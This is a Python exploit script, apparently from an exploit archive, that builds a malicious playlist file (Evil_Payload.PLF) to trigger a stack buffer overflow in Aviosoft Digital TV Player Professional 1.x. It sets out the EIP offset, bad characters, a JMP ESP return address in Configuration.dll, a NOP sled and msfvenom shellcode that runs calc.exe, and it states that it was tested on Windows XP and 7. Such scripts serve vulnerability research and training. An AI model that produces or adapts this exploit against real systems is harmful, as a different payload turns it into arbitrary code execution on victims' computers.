#!/usr/bin/env python
#-----------------------------------------------------------------------------------#
# Software      = Aviosoft Digital TV Player Professional 1.x                       #
# Download Link = http://www.aviosoft.com/download.html                             #
# Date          = 8/19/2017                                                         #
# Reference     = https://www.exploit-db.com/exploits/22932/                        #
# Author        = @ihack4falafel                                                    #
# Tested on     = Windows XP SP3 - Professional | Windows 7 SP1 - Enterprise        #
# EIP Offset    = 260                                                               #
# Badchars      = "\x00\x0A\x1A"                                                    #
# RET Address   = 0x6034c153 | "\xFF\xE4" | [Configuration.dll]                     #
# Usage         = Aviosoft DVT Player PRO > Open > Open Playlist > Evil_Payload.PLF #        
#-----------------------------------------------------------------------------------#

import struct

print "Creating evil file.."
f=open("Evil_Payload.PLF","w")

#----------------------------#
#      Buffer Structure      #
#----------------------------#
# buffer = AAA...........AAA #
# buffer = EIP - RET Address #
# buffer = NOPSled           #
# buffer = payload           #
# buffer = BBB...........BBB #
#----------------------------#

#------------------------------------------------------------------------------#
# msfvenom -p windows/exec CMD=calc.exe -b "\x00\x0A\x1A" -f python -v payload #
#------------------------------------------------------------------------------#

payload =  ""
payload += "\xba\x2f\xeb\xc8\xf0\xd9\xd0\xd9\x74\x24\xf4\x58"
payload += "\x31\xc9\xb1\x31\x31\x50\x13\x03\x50\x13\x83\xe8"
payload += "\xd3\x09\x3d\x0c\xc3\x4c\xbe\xed\x13\x31\x36\x08"
payload += "\x22\x71\x2c\x58\x14\x41\x26\x0c\x98\x2a\x6a\xa5"
payload += "\x2b\x5e\xa3\xca\x9c\xd5\x95\xe5\x1d\x45\xe5\x64"
payload += "\x9d\x94\x3a\x47\x9c\x56\x4f\x86\xd9\x8b\xa2\xda"
payload += "\xb2\xc0\x11\xcb\xb7\x9d\xa9\x60\x8b\x30\xaa\x95"
payload += "\x5b\x32\x9b\x0b\xd0\x6d\x3b\xad\x35\x06\x72\xb5"
payload += "\x5a\x23\xcc\x4e\xa8\xdf\xcf\x86\xe1\x20\x63\xe7"
payload += "\xce\xd2\x7d\x2f\xe8\x0c\x08\x59\x0b\xb0\x0b\x9e"
payload += "\x76\x6e\x99\x05\xd0\xe5\x39\xe2\xe1\x2a\xdf\x61"
payload += "\xed\x87\xab\x2e\xf1\x16\x7f\x45\x0d\x92\x7e\x8a"
payload += "\x84\xe0\xa4\x0e\xcd\xb3\xc5\x17\xab\x12\xf9\x48"
payload += "\x14\xca\x5f\x02\xb8\x1f\xd2\x49\xd6\xde\x60\xf4"
payload += "\x94\xe1\x7a\xf7\x88\x89\x4b\x7c\x47\xcd\x53\x57"
payload += "\x2c\x21\x1e\xfa\x04\xaa\xc7\x6e\x15\xb7\xf7\x44"
payload += "\x59\xce\x7b\x6d\x21\x35\x63\x04\x24\x71\x23\xf4"
payload += "\x54\xea\xc6\xfa\xcb\x0b\xc3\x98\x8a\x9f\x8f\x70"
payload += "\x29\x18\x35\x8d"

buffer =  "A" * 260
buffer += struct.pack('<L', 0x6034c153)
buffer += "\x90" * 40
buffer += payload
buffer += "B" * (2000-260-4-40-220)

try:   
    f.write(buffer)
    f.close()
    print "File created"
except:
    print "File cannot be created"
